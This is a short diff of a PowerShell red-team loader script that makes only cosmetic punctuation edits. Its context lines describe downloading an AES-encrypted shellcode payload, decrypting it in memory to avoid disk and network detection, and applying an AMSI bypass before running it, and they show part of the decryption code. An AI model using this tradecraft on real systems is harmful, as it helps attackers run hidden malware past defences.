@@ -3,9 +3,9 @@
 # ============================================================================
 # Technique:  Download AES-encrypted payload, decrypt in memory, execute
 # OPSEC Notes:
-#   - Payload is encrypted on the wire — network inspection sees ciphertext.
+#   - Payload is encrypted on the wire - network inspection sees ciphertext.
 #   - Shellcode never exists in plaintext on disk.
-#   - Key and IV are embedded in the script — protect this script accordingly.
+#   - Key and IV are embedded in the script - protect this script accordingly.
 #   - AMSI will inspect this script. Apply AMSI bypass before execution.
 #   - Use a unique key per engagement. Do not reuse keys across operations.
 #   - The AES key/IV can be derived from a passphrase if preferred.
@@ -127,7 +127,7 @@ try {
     $CryptoStream.FlushFinalBlock()
     [Byte[]]$Shellcode = $MemStream.ToArray()
 } catch {
-    Write-Error "Decryption failed — check key/IV: $_"
+    Write-Error "Decryption failed - check key/IV: $_"
     exit 1
 } finally {
     if ($CryptoStream) { $CryptoStream.Dispose() }
